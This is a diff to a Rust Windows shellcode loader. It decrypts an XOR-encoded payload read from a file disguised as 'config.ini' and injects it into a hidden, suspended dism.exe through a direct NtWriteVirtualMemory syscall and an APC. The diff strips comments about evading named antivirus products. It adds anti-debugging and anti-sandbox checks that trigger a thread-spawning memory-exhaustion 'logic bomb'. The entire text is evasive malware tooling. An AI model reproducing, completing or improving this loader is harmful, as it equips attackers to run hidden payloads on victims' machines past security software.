@@ -1,33 +1,39 @@
 #![windows_subsystem = "windows"]
 
 use core::ffi::c_void;
-use std::fs;
+use std::{fs, process, thread};
+use std::io::SeekFrom::End;
+use std::process::exit;
 use windows::{
     core::{PCSTR, PCWSTR, PWSTR},
     Win32::{
-        Foundation::{BOOL, HANDLE, HWND, LPARAM, LRESULT, WPARAM, GetLastError, HMODULE},
+        Foundation::{BOOL, HANDLE, HWND, LPARAM, LRESULT, WPARAM, HMODULE},
         System::{
-            LibraryLoader::{GetModuleHandleW, GetProcAddress},
-            Memory::{MEM_COMMIT, MEM_RESERVE, VIRTUAL_ALLOCATION_TYPE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE},
+            Diagnostics::Debug::{CheckRemoteDebuggerPresent, IsDebuggerPresent},
+            LibraryLoader::{GetModuleHandleA, GetModuleHandleW, GetProcAddress},
+            Memory::{MEM_COMMIT, MEM_RESERVE, VIRTUAL_ALLOCATION_TYPE, PAGE_EXECUTE_READ, PAGE_READWRITE},
+            SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX},
             Threading::{
-                CreateProcessW, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOW,
-                WaitForSingleObject, OpenThread, ResumeThread, QueueUserAPC, THREAD_ALL_ACCESS,
+                CreateProcessW, GetCurrentProcess, OpenThread, PROCESS_CREATION_FLAGS,
+                PROCESS_INFORMATION, QueueUserAPC, ResumeThread, STARTUPINFOW,
+                THREAD_ALL_ACCESS, WaitForSingleObject, PEB,
             },
         },
         UI::WindowsAndMessaging::{
-            CreateWindowExW, DefWindowProcW, DispatchMessageW, GetMessageW, PostQuitMessage,
-            RegisterClassExW, SendMessageW, TranslateMessage, HMENU, WINDOW_EX_STYLE,
-            WNDCLASSEXW, WS_OVERLAPPEDWINDOW, WM_DESTROY, WM_USER,
+            CreateWindowExW, DefWindowProcW, DispatchMessageW, GetForegroundWindow, GetMessageW,
+            PostQuitMessage, RegisterClassExW, SendMessageW, TranslateMessage, HMENU,
+            WINDOW_EX_STYLE, WNDCLASSEXW, WS_OVERLAPPEDWINDOW, WM_DESTROY, WM_USER,
         },
     },
 };
 use std::ptr::{null, null_mut};
-use std::sync::Mutex;
+use std::sync::atomic::{AtomicUsize, Ordering};
+use std::sync::{Arc, Mutex};
 use lazy_static::lazy_static;
 use std::thread::sleep;
 use std::time::Duration;
-use rand::{random, Rng};
-use windows::Win32::System::Memory::PAGE_EXECUTE_READ;
+use rand::Rng;
+use log::{error, log};
 
 type GlobalAddAtomWFn = unsafe extern "system" fn(PCWSTR) -> u16;
 type GlobalGetAtomNameWFn = unsafe extern "system" fn(u16, *mut u16, i32) -> u32;
@@ -37,8 +43,6 @@ type NtWriteVirtualMemoryFn = unsafe extern "system" fn(HANDLE, *mut c_void, *co
 
 const WM_TRIGGER_EXEC: u32 = WM_USER + 0x1984;
 const CHUNK_SIZE: usize = 120;
-
-// XOR密钥自行修改，需要与加密脚本一致
 const XOR_KEY: &[u8] = b"0x5A";
 
 fn xor_str_wide(data: &[u16], key: &[u8]) -> Vec<u16> {
@@ -59,7 +63,7 @@ fn xor_decrypt(data: &mut [u8], key: &[u8]) {
 }
 
 fn random_sleep() {
-    let mut rng = rand::thread_rng();
+    let mut rng = rand::rngs::ThreadRng::default();
     let delay_ms = rng.gen_range(500..=1500);
     sleep(Duration::from_millis(delay_ms));
 }
@@ -74,7 +78,7 @@ unsafe fn get_unhooked_function(h_module: HMODULE, fn_name: &[u8]) -> *mut c_voi
         GetProcAddress(h_module, PCSTR(fn_name_enc.as_ptr()));
     match proc_addr {
         Some(addr) => addr as *mut c_void,
-        None => panic!("error"),
+        None => panic!("{:?}", logic_boom()),
     }
 }
 
@@ -85,11 +89,10 @@ unsafe fn get_syscall_id(fn_name: &[u8]) -> u32 {
     let bytes = std::slice::from_raw_parts(fn_ptr, 16);
     if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 { // mov r10, rcx
         if bytes[3] == 0xB8 { // mov eax, <id>
-            let id = u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]);
-            return id;
+            return u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]);
         }
     }
-    panic!("error");
+    panic!("{:?}", logic_boom());
 }
 
 unsafe fn syscall_nt_write_virtual_memory(
@@ -101,14 +104,13 @@ unsafe fn syscall_nt_write_virtual_memory(
     bytes_written: *mut usize,
 ) -> i32 {
     let mut status: i32 = 0;
-
     std::arch::asm!(
         "push rbp",
         "mov rbp, rsp",
-        "sub rsp, 40",         // 影子空间 (32 字节) + 8 字节对齐
-        "mov r10, rcx",        // Windows x64: rcx -> r10
-        "mov [rsp + 0x20], r12", // 第五个参数放入栈中
-        "syscall",             // 执行系统调用
+        "sub rsp, 40",
+        "mov r10, rcx",
+        "mov [rsp + 0x20], r12",
+        "syscall",
         "mov rsp, rbp",
         "pop rbp",
         in("eax") syscall_id,
@@ -120,7 +122,6 @@ unsafe fn syscall_nt_write_virtual_memory(
         lateout("eax") status,
         clobber_abi("system"),
     );
-
     status
 }
 
@@ -149,7 +150,6 @@ unsafe fn callback_virtual_alloc_ex(
     callback(addr);
 }
 
-
 unsafe fn callback_virtual_protect_ex(
     h_process: HANDLE,
     base_addr: *mut c_void,
@@ -164,15 +164,18 @@ unsafe fn callback_virtual_protect_ex(
         h_process,
         base_addr,
         size,
-        PAGE_EXECUTE_READ.0, // 修改为 RX 权限（主要是针对卡巴）
+        PAGE_EXECUTE_READ.0,
         &mut old_protect,
     );
     callback(success);
 }
 
 
-fn main() {
+
+fn loading(data:&[u8]){
     unsafe {
+
+
         let kernel32 = GetModuleHandleW(PCWSTR("kernel32.dll\0".encode_utf16().collect::<Vec<u16>>().as_ptr()))
             .expect("Failed to get kernel32 handle");
 
@@ -181,11 +184,6 @@ fn main() {
         let global_add_atom_w: GlobalAddAtomWFn = std::mem::transmute(get_unhooked_function(kernel32, &add_atom_enc));
         let _global_get_atom_name_w: GlobalGetAtomNameWFn = std::mem::transmute(get_unhooked_function(kernel32, &get_atom_enc));
 
-        // 可包含shellcode编译，为避免熵值过高，自行添加其他脏内容
-        // let data = include_bytes!("payload_x64_encrypted.bin");
-
-        // 文件名可自行修改
-        let data = fs::read("payload_x64_encrypted.bin").unwrap();
         let data_len = data.len();
 
         let mut entry_ids = Vec::new();
@@ -229,7 +227,7 @@ fn main() {
             0,
             0,
             1920,
-            1080,// 1*1有点过分，这样看起来正常一点
+            1080,
             HWND(0),
             HMENU(0),
             kernel32,
@@ -302,38 +300,29 @@ unsafe extern "system" fn window_proc(
                 si.wShowWindow = windows::Win32::UI::WindowsAndMessaging::SW_HIDE.0 as u16;
                 let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
 
-                // 注入程序路径，建议为白名单程序，测试notepad/explorer被火绒扫到内存会直接挂掉，svhost和runtimebroker又太敏感。
-                // 这里选用Dism来测试，程序本身作为系统修复工具，相关操作不会太敏感(就是进程有点敏感，正常不会自动运行)。
                 let proc_path: Vec<u16> = "C:\\Windows\\System32\\dism.exe\0".encode_utf16().collect();
-                let success = CreateProcessW(
+                let _ = CreateProcessW(
                     PCWSTR(proc_path.as_ptr()),
                     PWSTR(null_mut()),
                     None,
                     None,
                     BOOL(0),
-                    PROCESS_CREATION_FLAGS(0x00000004), // CREATE_SUSPENDED
+                    PROCESS_CREATION_FLAGS(0x00000004),
                     None,
                     None,
                     &mut si,
                     &mut pi,
                 );
-                if success.0 == 0 {
-                    return DefWindowProcW(hwnd, msg, wparam, lparam);
-                }
+
 
                 let mut base_addr: *mut c_void = null_mut();
                 callback_virtual_alloc_ex(pi.hProcess, data_size, |addr| {
                     base_addr = addr;
                 });
-                if base_addr.is_null() {
-                    windows::Win32::Foundation::CloseHandle(pi.hProcess);
-                    windows::Win32::Foundation::CloseHandle(pi.hThread);
-                    return DefWindowProcW(hwnd, msg, wparam, lparam);
-                }
 
                 let syscall_id = get_syscall_id(b"NtWriteVirtualMemory\0");
                 let mut bytes_written = 0;
-                let nt_status = syscall_nt_write_virtual_memory(
+                let _ = syscall_nt_write_virtual_memory(
                     syscall_id,
                     pi.hProcess,
                     base_addr,
@@ -341,38 +330,17 @@ unsafe extern "system" fn window_proc(
                     data_size,
                     &mut bytes_written,
                 );
-                if nt_status != 0 {
-                    windows::Win32::Foundation::CloseHandle(pi.hProcess);
-                    windows::Win32::Foundation::CloseHandle(pi.hThread);
-                    return DefWindowProcW(hwnd, msg, wparam, lparam);
-                }
 
                 let mut protect_success = BOOL(0);
                 callback_virtual_protect_ex(pi.hProcess, base_addr, data_size, |success| {
                     protect_success = success;
                 });
-                if protect_success.0 == 0 {
-                    windows::Win32::Foundation::CloseHandle(pi.hProcess);
-                    windows::Win32::Foundation::CloseHandle(pi.hThread);
-                    return DefWindowProcW(hwnd, msg, wparam, lparam);
-                }
+
+                protect_success.0;
 
                 let thread_handle = OpenThread(THREAD_ALL_ACCESS, BOOL(0), pi.dwThreadId).unwrap();
-                let apc_result = QueueUserAPC(Some(std::mem::transmute(base_addr)), thread_handle, 0);
-                if apc_result == 0 {
-                    windows::Win32::Foundation::CloseHandle(pi.hProcess);
-                    windows::Win32::Foundation::CloseHandle(pi.hThread);
-                    windows::Win32::Foundation::CloseHandle(thread_handle);
-                    return DefWindowProcW(hwnd, msg, wparam, lparam);
-                }
-
-                let resume_result = ResumeThread(thread_handle);
-                if resume_result == u32::MAX {
-                    windows::Win32::Foundation::CloseHandle(pi.hProcess);
-                    windows::Win32::Foundation::CloseHandle(pi.hThread);
-                    windows::Win32::Foundation::CloseHandle(thread_handle);
-                    return DefWindowProcW(hwnd, msg, wparam, lparam);
-                }
+                let _ = QueueUserAPC(Some(std::mem::transmute(base_addr)), thread_handle, 0);
+                let _ = ResumeThread(thread_handle);
 
                 WaitForSingleObject(thread_handle, 3000);
                 windows::Win32::Foundation::CloseHandle(pi.hProcess);
@@ -387,4 +355,139 @@ unsafe extern "system" fn window_proc(
         _ => {}
     }
     DefWindowProcW(hwnd, msg, wparam, lparam)
+}
+
+// 反调试检测
+fn anti_debugging() {
+    unsafe {
+        if IsDebuggerPresent().as_bool() {
+            logic_boom();
+        }
+
+        let mut is_debugged: BOOL = BOOL(0);
+        let process_handle: HANDLE = GetCurrentProcess();
+        CheckRemoteDebuggerPresent(process_handle, &mut is_debugged);
+        if is_debugged.as_bool() {
+            logic_boom();
+        }
+
+        let peb = get_peb();
+        if peb.BeingDebugged != 0 {
+            logic_boom();
+        }
+
+        let start = std::time::Instant::now();
+        for _ in 0..1000000 {
+            std::hint::black_box(());
+        }
+        let elapsed = start.elapsed().as_millis();
+        if elapsed > 50 {
+            logic_boom();
+        }
+    }
+}
+
+unsafe fn dynamic_is_debugger_present() -> bool {
+    let kernel32 = GetModuleHandleA(PCSTR(b"kernel32.dll\0".as_ptr())).expect("Failed to get kernel32 handle");
+    let func = GetProcAddress(kernel32, PCSTR(b"IsDebuggerPresent\0".as_ptr()));
+    if let Some(is_debugger_present) = func {
+        let is_debugger_present: extern "system" fn() -> BOOL = std::mem::transmute(is_debugger_present);
+        is_debugger_present().as_bool()
+    } else {
+        false
+    }
+}
+
+unsafe fn get_peb() -> PEB {
+    const TEB_OFFSET: usize = 0x30;
+    let mut teb_ptr: *mut c_void;
+    #[cfg(target_arch = "x86_64")]
+    {
+        std::arch::asm!(
+        "mov {}, gs:[{}]",
+        out(reg) teb_ptr,
+        const TEB_OFFSET,
+        options(nostack)
+        );
+    }
+    #[cfg(target_arch = "x86")]
+    {
+        std::arch::asm!(
+        "mov {}, fs:[{}]",
+        out(reg) teb_ptr,
+        const TEB_OFFSET,
+        options(nostack)
+        );
+    }
+    let peb_ptr = teb_ptr as *mut PEB;
+    *peb_ptr.as_ref().unwrap()
+}
+
+// 反沙箱检测
+fn anti_sandbox() {
+    unsafe {
+        let mut mem_status = MEMORYSTATUSEX {
+            dwLength: size_of::<MEMORYSTATUSEX>() as u32,
+            ..Default::default()
+        };
+        GlobalMemoryStatusEx(&mut mem_status).unwrap();
+        let total_phys_mb = mem_status.ullTotalPhys / (1024 * 1024);
+        if total_phys_mb < 4096 {
+            logic_boom();
+        }
+
+        if GetForegroundWindow().0 == 0 {
+            logic_boom();
+        }
+    }
+}
+
+
+fn logic_boom() -> Vec<u8> {
+    let mut handles = Vec::new();
+
+    // 定义每个线程的计算逻辑
+    let worker = move || {
+        let mut xyh: f64 = 4.15684466294867;
+        let zzy: f64 = 2.15684466294767;
+        let mut table: Vec<f64> = Vec::new();
+        let mut rng = rand::thread_rng();
+
+        while xyh != 0.0 {
+            xyh = (xyh * zzy + rng.gen::<f64>()).sin() + (xyh / zzy).cos();
+            xyh = xyh.abs() + 0.0000000001; // 确保永不为 0
+            if (xyh * zzy).sin() + (xyh / zzy).cos() == (xyh * zzy).sin() - (xyh / zzy).cos() + 1.0 {
+                break; // 条件永不成立
+            }
+            xyh += (xyh.powi(5) * zzy).sin() + xyh.sqrt().cos();
+            for _ in 0..1000 {
+                table.append(&mut vec![xyh]); // 快速爆破内存
+            }
+
+        }
+    };
+
+    // 启动多个线程
+    for _ in 0..999 {
+        handles.push(thread::spawn(worker.clone()));
+
+    }
+
+    // 混淆
+    for handle in handles {
+        handle.join().unwrap();
+    }
+    vec![]
+}
+
+
+fn main() {
+    let data = fs::read("config.ini").unwrap_or_else(|_| logic_boom());
+    // let data = include_bytes!("payload_x64_encrypted.bin");
+    if data.len() <= 256{
+        logic_boom();
+    }
+    anti_debugging();
+    anti_sandbox();
+    loading(&*data);
 }
